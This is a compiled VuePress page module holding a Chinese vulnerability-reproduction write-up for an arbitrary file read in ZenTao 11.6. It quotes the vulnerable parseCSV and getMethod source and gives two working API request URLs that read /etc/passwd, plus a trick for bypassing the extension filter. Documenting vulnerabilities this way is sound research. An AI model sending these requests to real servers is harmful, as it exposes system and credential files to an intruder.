import{_ as t}from"./plugin-vue_export-helper-c27b6911.js";import{r as e,o,c as l,a as n,b as s,d as c,e as a}from"./app-58e4a7d6.js";const i={},u=a(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>禅道 11.6 版本中对用户接口调用权限过滤不完善，导致调用接口执行SQL语句导致SQL注入</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>禅道 11.6
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>这里使用docker环境搭建</p><div class="language-plain line-numbers-mode" data-ext="plain"><pre class="language-plain"><code>docker run --name zentao_v11.6 -p 8084:80 -v /u01/zentao/www:/app/zentaopms -v /u01/zentao/data:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=123456 -d docker.io/yunwisdom/zentao:v11.6
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div>`,7),r={href:"http://xxx.xxx.xxx.xxx:8084",target:"_blank",rel:"noopener noreferrer"},k=n("strong",null,"http://xxx.xxx.xxx.xxx:8084",-1),d=a(`<figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202162306063.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>这里造成漏洞的原因同样是调用接口权限无限制的原因</p><p>接口出现漏洞的原因具体参考可以查看上一篇 <strong>禅道 11.6版本 SQL注入漏洞</strong> 关于此漏洞的完整分析</p><h3 id="第一种方法" tabindex="-1"><a class="header-anchor" href="#第一种方法" aria-hidden="true">#</a> 第一种方法</h3><p>查看<strong>module/file/moudel.php</strong>下的<strong>parseCSV方法</strong></p><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">parseCSV</span><span class="token punctuation">(</span><span class="token variable">$fileName</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$fileName</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">/* Fix bug #890. */</span>
        <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;\\x82\\x32&quot;</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">&quot;\\x10&quot;</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$lines</span>   <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;\\n&quot;</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token variable">$col</span>  <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token variable">$row</span>  <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$lines</span> <span class="token keyword">as</span> <span class="token variable">$line</span><span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token variable">$line</span>    <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$line</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$markNum</span> <span class="token operator">=</span> <span class="token function">substr_count</span><span class="token punctuation">(</span><span class="token variable">$line</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">&#39;&quot;&#39;</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token function">substr_count</span><span class="token punctuation">(</span><span class="token variable">$line</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">&#39;\\&quot;&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$line</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token string single-quoted-string">&#39;,&#39;</span> <span class="token keyword">and</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$markNum</span> <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token keyword">and</span> <span class="token variable">$col</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token punctuation">(</span><span class="token variable">$markNum</span> <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token keyword">and</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$line</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token string single-quoted-string">&#39;,&quot;&#39;</span> <span class="token keyword">and</span> <span class="token variable">$col</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token variable">$line</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">&#39;,&#39;</span><span class="token punctuation">;</span>
            <span class="token variable">$line</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">&#39;,&quot;&quot;,&#39;</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">&#39;,,&#39;</span><span class="token punctuation">,</span> <span class="token variable">$line</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$line</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">&#39;,&quot;&quot;,&#39;</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">&#39;,,&#39;</span><span class="token punctuation">,</span> <span class="token variable">$line</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$line</span> <span class="token operator">=</span> <span class="token function">preg_replace_callback</span><span class="token punctuation">(</span><span class="token string single-quoted-string">&#39;/(\\&quot;{2,})(\\,+)/U&#39;</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">&#39;removeInterference&#39;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$line</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$line</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">&#39;&quot;&quot;&#39;</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">&#39;&quot;&#39;</span><span class="token punctuation">,</span> <span class="token variable">$line</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

            <span class="token comment">/* if only one column then line is the data. */</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$line</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">&#39;,&#39;</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token constant boolean">false</span> <span class="token keyword">and</span> <span class="token variable">$col</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
            <span class="token punctuation">{</span>
                <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token variable">$row</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$line</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">&#39;&quot;&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token keyword">else</span>
            <span class="token punctuation">{</span>
                <span class="token comment">/* if col is not -1, then the data of column is not end. */</span>
                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$col</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
                <span class="token punctuation">{</span>
                    <span class="token variable">$pos</span> <span class="token operator">=</span> <span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$line</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">&#39;&quot;,&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$pos</span> <span class="token operator">===</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span>
                    <span class="token punctuation">{</span>
                        <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token variable">$row</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$col</span><span class="token punctuation">]</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">&quot;\\n&quot;</span> <span class="token operator">.</span> <span class="token variable">$line</span><span class="token punctuation">;</span>
                        <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token variable">$row</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$col</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">&#39;&amp;comma;&#39;</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">&#39;,&#39;</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token variable">$row</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$col</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                        <span class="token keyword">continue</span><span class="token punctuation">;</span>
                    <span class="token punctuation">}</span>
                    <span class="token keyword">else</span>
                    <span class="token punctuation">{</span>
                        <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token variable">$row</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$col</span><span class="token punctuation">]</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">&quot;\\n&quot;</span> <span class="token operator">.</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$line</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$pos</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                        <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token variable">$row</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$col</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">&#39;&amp;comma;&#39;</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">&#39;,&#39;</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token variable">$row</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$col</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                        <span class="token variable">$line</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$line</span><span class="token punctuation">,</span> <span class="token variable">$pos</span> <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                        <span class="token variable">$col</span><span class="token operator">++</span><span class="token punctuation">;</span>
                    <span class="token punctuation">}</span>
                <span class="token punctuation">}</span>

                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$col</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token variable">$col</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
                <span class="token comment">/* explode cols with delimiter. */</span>
                <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token variable">$line</span><span class="token punctuation">)</span>
                <span class="token punctuation">{</span>
                    <span class="token comment">/* the cell has &#39;&quot;&#39;, the delimiter is &#39;&quot;,&#39;. */</span>
                    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$line</span><span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">}</span> <span class="token operator">==</span> <span class="token string single-quoted-string">&#39;&quot;&#39;</span><span class="token punctuation">)</span>
                    <span class="token punctuation">{</span>
                        <span class="token variable">$pos</span>  <span class="token operator">=</span> <span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$line</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">&#39;&quot;,&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$pos</span> <span class="token operator">===</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span>
                        <span class="token punctuation">{</span>
                            <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token variable">$row</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$col</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$line</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                            <span class="token comment">/* if line is not empty, then the data of cell is not end. */</span>
                            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$line</span><span class="token punctuation">)</span> <span class="token operator">&gt;=</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">continue</span> <span class="token number">2</span><span class="token punctuation">;</span>
                            <span class="token variable">$line</span> <span class="token operator">=</span> <span class="token string single-quoted-string">&#39;&#39;</span><span class="token punctuation">;</span>
                        <span class="token punctuation">}</span>
                        <span class="token keyword">else</span>
                        <span class="token punctuation">{</span>
                            <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token variable">$row</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$col</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$line</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token variable">$pos</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                            <span class="token variable">$line</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$line</span><span class="token punctuation">,</span> <span class="token variable">$pos</span> <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                        <span class="token punctuation">}</span>
                        <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token variable">$row</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$col</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">&#39;&amp;comma;&#39;</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">&#39;,&#39;</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token variable">$row</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$col</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token punctuation">}</span>
                    <span class="token keyword">else</span>
                    <span class="token punctuation">{</span>
                        <span class="token comment">/* the delimiter default is &#39;,&#39;. */</span>
                        <span class="token variable">$pos</span> <span class="token operator">=</span> <span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$line</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">&#39;,&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                        <span class="token comment">/* if line is not delimiter, then line is the data of cell. */</span>
                        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$pos</span> <span class="token operator">===</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span>
                        <span class="token punctuation">{</span>
                            <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token variable">$row</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$col</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$line</span><span class="token punctuation">;</span>
                            <span class="token variable">$line</span> <span class="token operator">=</span> <span class="token string single-quoted-string">&#39;&#39;</span><span class="token punctuation">;</span>
                        <span class="token punctuation">}</span>
                        <span class="token keyword">else</span>
                        <span class="token punctuation">{</span>
                            <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token variable">$row</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$col</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$line</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$pos</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                            <span class="token variable">$line</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$line</span><span class="token punctuation">,</span> <span class="token variable">$pos</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                        <span class="token punctuation">}</span>
                    <span class="token punctuation">}</span>

                    <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token variable">$row</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$col</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">&#39;&amp;comma;&#39;</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">&#39;,&#39;</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token variable">$row</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$col</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token variable">$col</span><span class="token operator">++</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>
            <span class="token variable">$row</span> <span class="token operator">++</span><span class="token punctuation">;</span>
            <span class="token variable">$col</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">return</span> <span class="token variable">$data</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>这里可以看到<strong>以file为模块名、parseCSV为方法名去调用</strong>读取文件</p><p>读取的文件名**$filename<strong>参数可控，例如读取</strong>/etc/passwd**</p><div class="language-plain line-numbers-mode" data-ext="plain"><pre class="language-plain"><code>http://xxx.xxx.xxx.xxx/api-getModel-file-parseCSV-fileName=/etc/passwd
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202162306195.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>注意以 .php .txt 结尾的会被 /framework/base/router.class.php中的parsePathInfo方法 过滤</p><h3 id="第二种方法" tabindex="-1"><a class="header-anchor" href="#第二种方法" aria-hidden="true">#</a> 第二种方法</h3><p>查看<strong>module/api/moudel.php</strong>下的<strong>getMethod方法</strong></p><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getMethod</span><span class="token punctuation">(</span><span class="token variable">$filePath</span><span class="token punctuation">,</span> <span class="token variable">$ext</span> <span class="token operator">=</span> <span class="token string single-quoted-string">&#39;&#39;</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token variable">$fileName</span>  <span class="token operator">=</span> <span class="token function">dirname</span><span class="token punctuation">(</span><span class="token variable">$filePath</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$className</span> <span class="token operator">=</span> <span class="token function">basename</span><span class="token punctuation">(</span><span class="token function">dirname</span><span class="token punctuation">(</span><span class="token function">dirname</span><span class="token punctuation">(</span><span class="token variable">$filePath</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">class_exists</span><span class="token punctuation">(</span><span class="token variable">$className</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token class-name static-context">helper</span><span class="token operator">::</span><span class="token function">import</span><span class="token punctuation">(</span><span class="token variable">$fileName</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$methodName</span> <span class="token operator">=</span> <span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$filePath</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token variable">$method</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ReflectionMethod</span><span class="token punctuation">(</span><span class="token variable">$className</span> <span class="token operator">.</span> <span class="token variable">$ext</span><span class="token punctuation">,</span> <span class="token variable">$methodName</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$data</span>   <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">stdClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$data</span><span class="token operator">-&gt;</span><span class="token property">startLine</span>  <span class="token operator">=</span> <span class="token variable">$method</span><span class="token operator">-&gt;</span><span class="token function">getStartLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$data</span><span class="token operator">-&gt;</span><span class="token property">endLine</span>    <span class="token operator">=</span> <span class="token variable">$method</span><span class="token operator">-&gt;</span><span class="token function">getEndLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$data</span><span class="token operator">-&gt;</span><span class="token property">comment</span>    <span class="token operator">=</span> <span class="token variable">$method</span><span class="token operator">-&gt;</span><span class="token function">getDocComment</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$data</span><span class="token operator">-&gt;</span><span class="token property">parameters</span> <span class="token operator">=</span> <span class="token variable">$method</span><span class="token operator">-&gt;</span><span class="token function">getParameters</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$data</span><span class="token operator">-&gt;</span><span class="token property">className</span>  <span class="token operator">=</span> <span class="token variable">$className</span><span class="token punctuation">;</span>
    <span class="token variable">$data</span><span class="token operator">-&gt;</span><span class="token property">methodName</span> <span class="token operator">=</span> <span class="token variable">$methodName</span><span class="token punctuation">;</span>
    <span class="token variable">$data</span><span class="token operator">-&gt;</span><span class="token property">fileName</span>   <span class="token operator">=</span> <span class="token variable">$fileName</span><span class="token punctuation">;</span>
    <span class="token variable">$data</span><span class="token operator">-&gt;</span><span class="token property">post</span>       <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>

    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">file</span><span class="token punctuation">(</span><span class="token variable">$fileName</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token variable">$data</span><span class="token operator">-&gt;</span><span class="token property">startLine</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;=</span> <span class="token variable">$data</span><span class="token operator">-&gt;</span><span class="token property">endLine</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">&#39;$this-&gt;post&#39;</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">&#39;fixer::input&#39;</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">&#39;$_POST&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token variable">$data</span><span class="token operator">-&gt;</span><span class="token property">post</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span> 
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> <span class="token variable">$data</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>这里与第一种大同小异，只是调用了不同模块的方法</p><p>看到 fileName = dirname(filepath) 这段则为返回的目录名</p><p>所以读取**/etc/passwd<strong>则需要写为</strong>/etc/passwd/1**来绕过</p><div class="language-plain line-numbers-mode" data-ext="plain"><pre class="language-plain"><code>http://xxx.xxx.xxx.xxx/api-getModel-api-getMethod-filePath=/etc/passwd/1
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202162306873.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,20);function v(b,m){const p=e("ExternalLinkIcon");return o(),l("div",null,[u,n("p",null,[s("访问 "),n("a",r,[k,c(p)]),s(" 按步骤安装即可")]),d])}const f=t(i,[["render",v],["__file","禅道 11.6 api-getModel-api-getMethod-filePath 任意文件读取漏洞.html.vue"]]);export{f as default};
